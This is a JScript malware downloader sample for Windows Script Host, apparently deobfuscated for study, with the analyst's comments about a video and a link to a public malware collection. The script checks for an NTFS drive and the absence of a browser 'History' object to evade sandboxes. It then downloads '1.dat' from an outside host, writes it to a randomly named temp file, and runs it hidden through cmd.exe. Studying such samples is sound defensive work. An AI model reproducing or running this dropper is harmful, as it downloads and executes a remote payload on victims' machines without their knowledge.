var fso = WScript.CreateObject("Scripting.FileSystemObject");
if((function anonymous(
    ) {
    if(fso.GetDrive(fso.GetDriveName('C:\\\\\\\\skldfklsdkfsdklfkskfklsdkfewr32432432\\\\\\\\dsfsdfsf')).FileSystem == 'NTFS' && typeof History == 'undefined') 
        return true;             // In the pervious video i was bit confused about this return values, like where it is being used after that i figured it out that 
    else                         // anonymous function was being called inside the if statement and it return either true of false and if it returns true
        return false;            // then the code inside if block gets executed.
})){
    var fso1 = this.WScript.CreateObject("Scripting.FileSystemObject");
    var wshshell = WScript.CreateObject("WScript.Shell");
    var xhttp = WScript.CreateObject("MSXML2.XMLHTTP");
    var stream = WScript.CreateObject("ADODB.Stream");


    var tempFolder = fso1.GetSpecialFolder(2); //temp folder
    var randomFileName = fso1.GetTempName();

    var open = xhttp.open("GET", "http://www.astrovoerta.top/admin.php?f=1.dat",0);
    xhttp.send();
    stream.type = 1 //binary
    res = xhttp.ResponseBody;
    var sff = WScript.ScriptFullName;

    stream.open();
    stream.Write(res);
    stream.SaveToFile(tempFolder+randomFileName);
    wshshell.run("cmd.exe /c "+tempFolder+randomFileName+ "","0");
}



//https://github.com/HynekPetrak/javascript-malware-collection/blob/master/2017/20170202/20170202_fd62ce23cc6f4d5aa5f37369d7be95af.js original sample link
